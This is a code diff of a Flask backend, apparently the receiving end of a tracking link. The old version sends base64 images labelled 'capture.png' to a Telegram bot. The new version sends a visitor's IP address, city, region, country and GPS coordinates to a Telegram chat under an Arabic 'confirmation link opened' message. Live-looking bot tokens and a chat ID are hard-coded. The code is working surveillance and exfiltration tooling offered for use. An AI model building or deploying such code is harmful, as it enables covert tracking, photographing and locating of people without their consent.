@@ -1,26 +1,33 @@
-
-from flask import Flask, request, render_template
-import requests, base64
+from flask import Flask, request
+import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = '7644893967:AAGHyiyBZwtl1fDi9bqFciuRKsnIz0yjB5Q'
+BOT_TOKEN = '8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0'
 CHAT_ID = '7485197107'
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+@app.route('/location', methods=['POST'])
+def location():
+    data = request.get_json()
+    ip = data.get("ip", "unknown")
+    city = data.get("city", "unknown")
+    region = data.get("region", "unknown")
+    country = data.get("country_name", "unknown")
+    latitude = data.get("latitude", "unknown")
+    longitude = data.get("longitude", "unknown")
 
-@app.route('/upload', methods=['POST'])
-def upload():
-    data = request.json['image']
-    _, img_data = data.split(',', 1)
-    img_bytes = base64.b64decode(img_data)
-    files = {'photo': ('capture.png', img_bytes)}
-    params = {'chat_id': CHAT_ID}
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    resp = requests.post(url, params=params, files=files)
-    return resp.json()
+    message = f"""📍 تم فتح رابط التأكيد:
+
+IP: {ip}
+الموقع: {city}, {region}, {country}
+الإحداثيات: {latitude}, {longitude}
+"""
+    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
+        "chat_id": CHAT_ID,
+        "text": message
+    })
+
+    return "OK"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host="0.0.0.0", port=10000)
